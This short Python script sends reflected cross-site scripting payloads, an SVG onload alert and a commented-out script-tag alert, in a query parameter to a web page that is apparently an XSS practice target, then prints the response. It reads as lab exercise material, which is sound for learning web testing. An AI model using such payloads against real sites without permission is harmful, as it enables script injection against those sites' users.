#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

# payload = '</h1><script>alert(1+2)</script>'
payload = '<svg onload=alert(1)>'

params = {'p05': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
